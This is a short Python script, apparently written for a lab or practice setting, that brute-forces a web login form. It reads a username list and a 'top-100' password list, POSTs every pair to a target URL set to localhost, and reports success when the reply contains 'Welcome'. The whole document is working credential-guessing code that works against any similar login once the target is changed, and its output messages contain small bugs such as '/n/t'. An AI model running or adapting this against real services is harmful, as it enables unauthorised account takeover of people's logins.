import requests
import sys

# modify the target for whatever the target url is
target = "http://127.0.0.1:4444"
username_file = "myPasswords.txt"
passwords = "top-100.txt"
needle = "Welcome"

usernames = []

with open(username_file, "r") as file:
    for line in file:
        usernames.append(line.strip())

for username in usernames:
    with open(passwords, "r") as passwords_list:
        for password in passwords_list:
            password = password.strip().encode()
            sys.stdout.write(f"- user: {username} / pass: {password.decode()}")
            sys.stdout.flush()
            # make a request with the username in the "username" field
                # likewise with the password
            r = requests.post(target, data={"username": username, "password": password})
            if needle.encode() in r.content:
                sys.stdout.write(f"/n/t found: {password.decode()} for user {username}")
        sys.stdout.flush()
        sys.stdout.write(f"No pass found for {username}")
